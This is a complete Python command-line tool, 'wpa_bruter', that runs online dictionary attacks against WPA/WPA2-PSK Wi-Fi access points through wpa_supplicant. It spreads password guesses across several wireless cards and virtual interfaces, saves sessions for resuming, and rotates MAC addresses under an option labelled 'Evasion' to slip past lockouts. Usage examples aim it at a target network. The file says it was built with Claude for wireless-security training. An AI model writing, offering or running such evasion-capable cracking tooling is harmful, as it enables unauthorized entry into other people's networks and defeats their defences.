#!/usr/bin/env python3
"""
wpa_bruter - Online WPA/WPA2-PSK Brute Force Tool

Performs online dictionary attacks against WPA/WPA2 access points
using wpa_supplicant in managed mode. No monitor mode required.

Features:
  - No monitor mode required (managed mode only)
  - Multi-interface support (physical cards + VIFs)
  - Threaded parallel authentication attempts
  - MAC randomization with configurable rotation
  - Session save/resume support
  - Real-time progress tracking

Author : Built with Claude for ICTAK CSA/Wireless Security training
License: MIT
"""

import argparse
import hashlib
import json
import os
import random
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path


# ─── Terminal Colors ──────────────────────────────────────────────────────────

class C:
    R   = '\033[91m'   # Red
    G   = '\033[92m'   # Green
    Y   = '\033[93m'   # Yellow
    B   = '\033[94m'   # Blue
    M   = '\033[95m'   # Magenta
    CY  = '\033[96m'   # Cyan
    BD  = '\033[1m'    # Bold
    DM  = '\033[2m'    # Dim
    RS  = '\033[0m'    # Reset


BANNER = f"""{C.CY}{C.BD}
 ██╗    ██╗██████╗  █████╗         ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗
 ██║    ██║██╔══██╗██╔══██╗        ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗
 ██║ █╗ ██║██████╔╝███████║        ██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██████╔╝
 ██║███╗██║██╔═══╝ ██╔══██║        ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══██╗
 ╚███╔███╔╝██║     ██║  ██║        ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║
  ╚══╝╚══╝ ╚═╝     ╚═╝  ╚═╝        ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
{C.RS}{C.DM}  Online WPA/WPA2-PSK Dictionary Attack Tool
  Managed Mode | Multi-Interface | VIF Support | MAC Randomization{C.RS}
"""


# ─── Session Manager ─────────────────────────────────────────────────────────

class SessionManager:
    """Save and resume brute force sessions."""

    def __init__(self, session_dir="~/.wpa_bruter/sessions"):
        self.session_dir = Path(session_dir).expanduser()
        self.session_dir.mkdir(parents=True, exist_ok=True)

    def _session_id(self, bssid, ssid, wordlist):
        key = f"{bssid}:{ssid}:{wordlist}"
        return hashlib.md5(key.encode()).hexdigest()[:12]

    def save(self, bssid, ssid, wordlist, attempted_count, found_key=None):
        sid = self._session_id(bssid, ssid, wordlist)
        data = {
            "bssid": bssid,
            "ssid": ssid,
            "wordlist": os.path.abspath(wordlist),
            "attempted": attempted_count,
            "found_key": found_key,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        with open(self.session_dir / f"{sid}.json", "w") as f:
            json.dump(data, f, indent=2)

    def load(self, bssid, ssid, wordlist):
        sid = self._session_id(bssid, ssid, wordlist)
        path = self.session_dir / f"{sid}.json"
        if path.exists():
            with open(path) as f:
                return json.load(f)
        return None


# ─── Interface Manager ────────────────────────────────────────────────────────

class InterfaceManager:
    """Create/destroy VIFs, randomise MACs, query phy capabilities."""

    def __init__(self):
        self.created_vifs: list[str] = []

    # ── queries ──

    @staticmethod
    def exists(iface: str) -> bool:
        return Path(f"/sys/class/net/{iface}").exists()

    @staticmethod
    def get_phy(iface: str):
        p = Path(f"/sys/class/net/{iface}/phy80211/name")
        return p.read_text().strip() if p.exists() else None

    @staticmethod
    def get_mac(iface: str):
        p = Path(f"/sys/class/net/{iface}/address")
        return p.read_text().strip() if p.exists() else None

    @staticmethod
    def max_managed_vifs(phy: str) -> int:
        """Parse `iw phy info` for max concurrent managed interfaces."""
        try:
            out = subprocess.run(
                ["iw", "phy", phy, "info"],
                capture_output=True, text=True, timeout=5
            ).stdout
            # Look for combo lines like:  * #{ managed } <= 4
            for line in out.splitlines():
                if "managed" in line.lower() and "<=" in line:
                    m = re.search(r"<=\s*(\d+)", line)
                    if m:
                        return int(m.group(1))
        except Exception:
            pass
        return 1

    # ── VIF lifecycle ──

    def create_vif(self, parent: str, name: str) -> bool:
        try:
            subprocess.run(
                ["iw", "dev", parent, "interface", "add", name, "type", "managed"],
                capture_output=True, text=True, timeout=5, check=True,
            )
            time.sleep(0.3)
            subprocess.run(["ip", "link", "set", name, "up"],
                           capture_output=True, timeout=5)
            self.created_vifs.append(name)
            return True
        except subprocess.CalledProcessError:
            return False

    def destroy_vif(self, name: str):
        try:
            subprocess.run(["iw", "dev", name, "del"],
                           capture_output=True, timeout=5)
        except Exception:
            pass
        if name in self.created_vifs:
            self.created_vifs.remove(name)

    def cleanup(self):
        for vif in list(self.created_vifs):
            self.destroy_vif(vif)

    # ── MAC manipulation ──

    @staticmethod
    def randomize_mac(iface: str) -> str | None:
        """Set a random locally-administered unicast MAC."""
        octets = [random.randint(0x00, 0xFF) for _ in range(6)]
        octets[0] = (octets[0] & 0xFC) | 0x02  # locally administered, unicast
        mac = ":".join(f"{b:02x}" for b in octets)
        try:
            subprocess.run(["ip", "link", "set", iface, "down"],
                           capture_output=True, timeout=5, check=True)
            subprocess.run(["ip", "link", "set", iface, "address", mac],
                           capture_output=True, timeout=5, check=True)
            subprocess.run(["ip", "link", "set", iface, "up"],
                           capture_output=True, timeout=5, check=True)
            return mac
        except subprocess.CalledProcessError:
            subprocess.run(["ip", "link", "set", iface, "up"],
                           capture_output=True, timeout=5)
            return None


# ─── WPA Worker Thread ────────────────────────────────────────────────────────

class WpaWorker(threading.Thread):
    """
    One worker per interface.  Manages its own wpa_supplicant instance and
    iterates through its assigned chunk of the wordlist.
    """

    def __init__(
        self,
        wid: int,
        interface: str,
        ssid: str,
        bssid: str | None,
        freq: int | None,
        next_word_cb,
        timeout: int,
        mac_rotate: int,
        driver: str,
        found_event: threading.Event,
        stats: dict,
        lock: threading.Lock,
        verbose: bool,
    ):
        super().__init__(daemon=True)
        self.wid = wid
        self.interface = interface
        self.ssid = ssid
        self.bssid = bssid
        self.freq = freq
        self.next_word_cb = next_word_cb
        self.timeout = timeout
        self.mac_rotate = mac_rotate
        self.driver = driver
        self.found_event = found_event
        self.stats = stats
        self.lock = lock
        self.verbose = verbose

        self.found_key: str | None = None
        self.attempts = 0
        self.active = True
        self.current_index: int | None = None

        # Each worker gets an isolated ctrl dir so wpa_cli doesn't clash
        self.ctrl_dir = tempfile.mkdtemp(prefix=f"wpabruter_w{wid}_")
        self.conf_path = os.path.join(self.ctrl_dir, "supplicant.conf")
        self.pid_path = os.path.join(self.ctrl_dir, "supplicant.pid")

    # ── wpa_supplicant / wpa_cli helpers ──

    def _write_conf(self):
        with open(self.conf_path, "w") as f:
            f.write(f"ctrl_interface={self.ctrl_dir}\n")
            f.write("update_config=0\n")
            f.write("ap_scan=1\n")
            # Disable background scanning to speed up attempts
            f.write("autoscan=exponential:3:60\n")

    def _start_supplicant(self) -> bool:
        self._write_conf()
        # Kill any lingering supplicant on this interface
        subprocess.run(
            ["pkill", "-f", f"wpa_supplicant.*-i\\s*{self.interface}"],
            capture_output=True, timeout=5,
        )
        time.sleep(0.5)

        proc = subprocess.run(
            [
                "wpa_supplicant",
                "-i", self.interface,
                "-c", self.conf_path,
                "-D", self.driver,
                "-B",                       # daemonize
                "-P", self.pid_path,
            ],
            capture_output=True, text=True, timeout=10,
        )
        if proc.returncode != 0:
            self._log(f"wpa_supplicant start failed: {proc.stderr.strip()}", "err")
            return False

        # Give daemon time to initialise the ctrl socket
        time.sleep(1.0)
        pong = self._cli("ping")
        if "PONG" not in pong:
            self._log("wpa_cli cannot reach supplicant", "err")
            return False
        return True

    def _stop_supplicant(self):
        self._cli("terminate")
        time.sleep(0.3)

    def _cli(self, *args) -> str:
        """Run wpa_cli and return stdout."""
        cmd = ["wpa_cli", "-i", self.interface, "-p", self.ctrl_dir] + list(args)
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return r.stdout.strip()
        except (subprocess.TimeoutExpired, Exception):
            return ""

    # ── single-attempt logic ──

    def _try_passphrase(self, psk: str) -> bool:
        """
        Configure a network block, attempt association, poll for result.
        Returns True if authentication succeeds.
        """
        self._cli("remove_network", "all")

        net_id = self._cli("add_network").split("\n")[-1].strip()
        if not net_id.isdigit():
            return False

        self._cli("set_network", net_id, "ssid", f'"{self.ssid}"')
        self._cli("set_network", net_id, "psk",  f'"{psk}"')
        self._cli("set_network", net_id, "key_mgmt", "WPA-PSK")
        self._cli("set_network", net_id, "scan_ssid", "1")

        if self.bssid:
            self._cli("set_network", net_id, "bssid", self.bssid)
        if self.freq:
            self._cli("set_network", net_id, "scan_freq", str(self.freq))

        self._cli("select_network", net_id)

        # Poll for authentication result
        t0 = time.time()
        while time.time() - t0 < self.timeout:
            if not self.active or self.found_event.is_set():
                self._cli("disconnect")
                return False

            status = self._cli("status")

            if "wpa_state=COMPLETED" in status:
                self._cli("disconnect")
                return True

            # If we've moved to DISCONNECTED after the initial connection
            # window, treat as auth failure
            if "wpa_state=DISCONNECTED" in status and (time.time() - t0) > 3:
                break

            time.sleep(0.25)

        self._cli("disconnect")
        return False

    # ── main loop ──

    def run(self):
        try:
            if not self._start_supplicant():
                return

            self._log(
                f"Started on {C.BD}{self.interface}{C.RS} "
                f"(MAC {InterfaceManager.get_mac(self.interface)})",
                "info",
            )

            mac_counter = 0

            while self.active and not self.found_event.is_set():
                idx, line = self.next_word_cb()
                if line is None:
                    self.current_index = None
                    break
                
                self.current_index = idx
                psk = line.strip()

                # WPA-PSK passphrase must be 8-63 ASCII characters
                if not psk or len(psk) < 8 or len(psk) > 63:
                    with self.lock:
                        self.stats["skipped"] += 1
                    continue

                # ── MAC rotation ──
                if self.mac_rotate > 0:
                    mac_counter += 1
                    if mac_counter >= self.mac_rotate:
                        mac_counter = 0
                        self._stop_supplicant()
                        new_mac = InterfaceManager.randomize_mac(self.interface)
                        if new_mac:
                            self._log(f"MAC rotated -> {new_mac}", "dim")
                        if not self._start_supplicant():
                            self._log("Cannot restart supplicant after MAC rotate", "err")
                            break
                        time.sleep(0.3)

                if self.verbose:
                    self._log(f"Trying: {psk}", "dim")

                if self._try_passphrase(psk):
                    self.found_key = psk
                    self.found_event.set()
                    self._log(f"KEY FOUND >>> {C.BD}{psk}{C.RS} <<<", "ok")
                    break

                with self.lock:
                    self.stats["attempted"] += 1
                self.attempts += 1

        except Exception as exc:
            self._log(f"Exception: {exc}", "err")
        finally:
            self._stop_supplicant()
            shutil.rmtree(self.ctrl_dir, ignore_errors=True)

    def stop(self):
        self.active = False

    # ── logging ──

    def _log(self, msg: str, level: str = "info"):
        tag = {
            "info": f"{C.B}[W{self.wid}]{C.RS}",
            "ok":   f"{C.G}{C.BD}[W{self.wid}]{C.RS}",
            "err":  f"{C.R}[W{self.wid}]{C.RS}",
            "dim":  f"{C.DM}[W{self.wid}]{C.RS}",
        }.get(level, f"[W{self.wid}]")
        with self.lock:
            print(f"  {tag} {msg}")


# ─── Main Orchestrator ────────────────────────────────────────────────────────

class WpaBruter:

    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.iface_mgr = InterfaceManager()
        self.session_mgr = SessionManager()
        self.workers: list[WpaWorker] = []
        self.found_event = threading.Event()
        self.stats = {"attempted": 0, "skipped": 0, "total": 0}
        self.lock = threading.Lock()
        self.start_time = 0.0
        self.resume_skip = 0
        self.word_index = 0
        self.words: list[str] = []

        signal.signal(signal.SIGINT,  self._on_signal)
        signal.signal(signal.SIGTERM, self._on_signal)

    # ── helpers ──

    def _on_signal(self, _sig, _frame):
        print(f"\n{C.Y}[!] Interrupted — saving session and cleaning up...{C.RS}")
        self._shutdown()
        sys.exit(130)

    @staticmethod
    def _fmt(seconds: float) -> str:
        h, rem = divmod(int(seconds), 3600)
        m, s = divmod(rem, 60)
        return f"{h}h{m:02d}m{s:02d}s" if h else (f"{m}m{s:02d}s" if m else f"{s}s")

    # ── wordlist ──

    def _load_wordlist(self) -> list[str]:
        path = self.args.wordlist
        if not os.path.isfile(path):
            print(f"{C.R}[!] Wordlist not found: {path}{C.RS}")
            sys.exit(1)

        with open(path, "r", errors="ignore") as f:
            words = f.readlines()

        skip = 0
        if self.args.resume:
            sess = self.session_mgr.load(
                self.args.bssid or "", self.args.ssid, path
            )
            if sess and sess.get("attempted"):
                skip = sess["attempted"]
                print(f"{C.Y}[*] Resuming session — skipping first {skip} words{C.RS}")
        self.resume_skip = skip

        words = words[skip:]
        self.stats["total"] = len(words)
        return words

    # ── interfaces ──

    def _prepare_interfaces(self) -> list[str]:
        ifaces: list[str] = []

        for base in self.args.interface:
            if not InterfaceManager.exists(base):
                print(f"{C.R}[!] Interface not found: {base}{C.RS}")
                continue
            ifaces.append(base)

            if self.args.vifs > 0:
                phy = InterfaceManager.get_phy(base)
                if not phy:
                    print(f"{C.Y}[-] Cannot determine phy for {base}, skipping VIFs{C.RS}")
                    continue

                cap = InterfaceManager.max_managed_vifs(phy)
                want = min(self.args.vifs, max(cap - 1, 0))
                print(f"{C.B}[*] {phy} ({base}): max {cap} managed VIFs, "
                      f"creating {want}{C.RS}")

                for i in range(want):
                    vname = f"{base}_v{i}"
                    if self.iface_mgr.create_vif(base, vname):
                        ifaces.append(vname)
                        print(f"{C.G}  [+] Created VIF {vname} "
                              f"(MAC {InterfaceManager.get_mac(vname)}){C.RS}")
                    else:
                        print(f"{C.Y}  [-] Failed to create VIF {vname}{C.RS}")

        if not ifaces:
            print(f"{C.R}[!] No usable interfaces.{C.RS}")
            sys.exit(1)

        return ifaces

    # ── iterator ──

    def _get_next_word(self) -> tuple[int, str] | tuple[None, None]:
        with self.lock:
            if self.word_index < len(self.words):
                idx = self.word_index
                w = self.words[idx]
                self.word_index += 1
                return idx, w
            return None, None

    def _get_safe_resume_count(self) -> int:
        active = [w.current_index for w in self.workers if w.current_index is not None]
        if active:
            safe_idx = min(active)
        else:
            safe_idx = self.word_index
        return self.resume_skip + safe_idx

    # ── progress ──

    def _progress_loop(self):
        while not self.found_event.is_set():
            time.sleep(2)
            with self.lock:
                done  = self.stats["attempted"]
                total = self.stats["total"]
                skip  = self.stats["skipped"]

            if done == 0:
                continue

            elapsed = time.time() - self.start_time
            rate = done / elapsed if elapsed > 0 else 0
            eta  = (total - done) / rate if rate > 0 else 0
            pct  = done / total * 100 if total else 0

            bar_w = 20
            filled = int(bar_w * pct / 100)
            bar = f"{'█' * filled}{'░' * (bar_w - filled)}"

            line = (
                f"\r  {C.CY}[{bar}] {done}/{total} ({pct:.1f}%) "
                f"| {rate:.1f} k/s "
                f"| {self._fmt(elapsed)} elapsed "
                f"| ETA {self._fmt(eta)} "
                f"| skip {skip}{C.RS}"
            )
            print(line, end="", flush=True)

    # ── run ──

    def run(self):
        print(BANNER)

        # Preflight checks
        if os.geteuid() != 0:
            print(f"{C.R}[!] Must run as root (need wpa_supplicant, ip link, iw){C.RS}")
            sys.exit(1)

        missing = [d for d in ("wpa_supplicant", "wpa_cli", "iw", "ip")
                    if not shutil.which(d)]
        if missing:
            print(f"{C.R}[!] Missing dependencies: {', '.join(missing)}{C.RS}")
            sys.exit(1)

        self.words = self._load_wordlist()
        if not self.words:
            print(f"{C.R}[!] Wordlist empty or fully exhausted{C.RS}")
            sys.exit(1)

        ifaces = self._prepare_interfaces()

        # Print attack summary
        print(f"\n  {C.BD}{'─' * 50}{C.RS}")
        print(f"  {C.BD}Target SSID   :{C.RS} {self.args.ssid}")
        print(f"  {C.BD}Target BSSID  :{C.RS} {self.args.bssid or 'Any'}")
        if self.args.freq:
            print(f"  {C.BD}Frequency     :{C.RS} {self.args.freq} MHz")
        print(f"  {C.BD}Interfaces    :{C.RS} {', '.join(ifaces)} "
              f"({len(ifaces)} workers)")
        print(f"  {C.BD}Wordlist      :{C.RS} {self.args.wordlist} "
              f"({len(self.words)} candidates)")
        print(f"  {C.BD}Auth timeout  :{C.RS} {self.args.timeout}s")
        print(f"  {C.BD}Driver        :{C.RS} {self.args.driver}")
        if self.args.mac_rotate > 0:
            print(f"  {C.BD}MAC rotation  :{C.RS} every {self.args.mac_rotate} attempts")
        print(f"  {C.BD}{'─' * 50}{C.RS}\n")

        # Launch workers with shared wordlist
        self.start_time = time.time()

        for idx, iface in enumerate(ifaces):
            w = WpaWorker(
                wid=idx,
                interface=iface,
                ssid=self.args.ssid,
                bssid=self.args.bssid,
                freq=self.args.freq,
                next_word_cb=self._get_next_word,
                timeout=self.args.timeout,
                mac_rotate=self.args.mac_rotate,
                driver=self.args.driver,
                found_event=self.found_event,
                stats=self.stats,
                lock=self.lock,
                verbose=self.args.verbose,
            )
            self.workers.append(w)

        # Progress thread
        mon = threading.Thread(target=self._progress_loop, daemon=True)
        mon.start()

        print(f"  {C.G}[*] Launching {len(self.workers)} worker(s)...{C.RS}\n")
        for w in self.workers:
            w.start()

        for w in self.workers:
            w.join()

        # ── results ──
        elapsed = time.time() - self.start_time
        found = next((w.found_key for w in self.workers if w.found_key), None)

        print(f"\n\n  {'═' * 50}")
        if found:
            print(f"\n  {C.G}{C.BD}  PASSWORD FOUND!{C.RS}")
            print(f"  {C.G}{C.BD}  Key : {found}{C.RS}")
            print(f"  {C.G}  SSID  : {self.args.ssid}{C.RS}")
            print(f"  {C.G}  BSSID : {self.args.bssid or 'N/A'}{C.RS}")
        else:
            print(f"\n  {C.Y}  Key not found in wordlist.{C.RS}")

        print(f"\n  Attempted : {self.stats['attempted']}")
        print(f"  Skipped   : {self.stats['skipped']} "
              f"(invalid length / empty)")
        print(f"  Time      : {self._fmt(elapsed)}")
        if elapsed > 0:
            print(f"  Rate      : {self.stats['attempted'] / elapsed:.2f} keys/sec")
        print(f"  {'═' * 50}\n")

        self.session_mgr.save(
            self.args.bssid or "",
            self.args.ssid,
            self.args.wordlist,
            self._get_safe_resume_count(),
            found,
        )
        self.iface_mgr.cleanup()

    def _shutdown(self):
        self.found_event.set()
        for w in self.workers:
            w.stop()
        self.session_mgr.save(
            self.args.bssid or "",
            self.args.ssid,
            self.args.wordlist,
            self._get_safe_resume_count(),
        )
        for w in self.workers:
            w.join(timeout=5)
        self.iface_mgr.cleanup()


# ─── CLI ──────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="wpa_bruter",
        description="Online WPA/WPA2-PSK dictionary attack via wpa_supplicant",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""{C.DM}
Examples
────────
  # Single interface
  sudo python3 wpa_bruter.py -i wlan0 -s "TargetAP" -b AA:BB:CC:DD:EE:FF -w wordlist.txt

  # Two physical cards in parallel
  sudo python3 wpa_bruter.py -i wlan0 wlan1 -s "TargetAP" -b AA:BB:CC:DD:EE:FF -w wordlist.txt

  # One card + 3 VIFs, rotate MAC every 5 attempts
  sudo python3 wpa_bruter.py -i wlan0 --vifs 3 --mac-rotate 5 -s "TargetAP" -b AA:BB:CC:DD:EE:FF -w wordlist.txt

  # Specify frequency to skip scanning, resume previous session
  sudo python3 wpa_bruter.py -i wlan0 -s "TargetAP" -b AA:BB:CC:DD:EE:FF -w wordlist.txt -f 2437 --resume

  # Multiple cards + VIFs + verbose
  sudo python3 wpa_bruter.py -i wlan0 wlan1 wlan2 --vifs 2 -s "TargetAP" -b AA:BB:CC:DD:EE:FF -w wordlist.txt -v
{C.RS}""",
    )

    # Required
    p.add_argument("-i", "--interface", nargs="+", required=True,
                   metavar="IFACE",
                   help="Wireless interface(s) to use")
    p.add_argument("-s", "--ssid", required=True,
                   help="Target SSID")
    p.add_argument("-w", "--wordlist", required=True,
                   metavar="FILE",
                   help="Path to wordlist / dictionary file")

    # Targeting
    p.add_argument("-b", "--bssid", default=None,
                   metavar="MAC",
                   help="Target BSSID (strongly recommended)")
    p.add_argument("-f", "--freq", type=int, default=None,
                   metavar="MHZ",
                   help="AP frequency in MHz (e.g. 2437 for ch6) — "
                        "avoids scanning overhead")

    # Parallelism
    p.add_argument("--vifs", type=int, default=0,
                   metavar="N",
                   help="Virtual interfaces to create per physical card "
                        "(default: 0)")

    # Evasion
    p.add_argument("--mac-rotate", type=int, default=0,
                   metavar="N",
                   help="Randomise MAC every N attempts per worker "
                        "(default: 0 = off)")

    # Tuning
    p.add_argument("-t", "--timeout", type=int, default=15,
                   metavar="SEC",
                   help="Seconds to wait per auth attempt (default: 15)")
    p.add_argument("--driver", default="nl80211",
                   choices=["nl80211", "wext"],
                   help="wpa_supplicant driver (default: nl80211)")

    # Session
    p.add_argument("--resume", action="store_true",
                   help="Resume from the last saved session for this "
                        "target + wordlist")

    # Output
    p.add_argument("-v", "--verbose", action="store_true",
                   help="Print every passphrase as it is tried")

    return p


def main():
    args = build_parser().parse_args()
    WpaBruter(args).run()


if __name__ == "__main__":
    main()
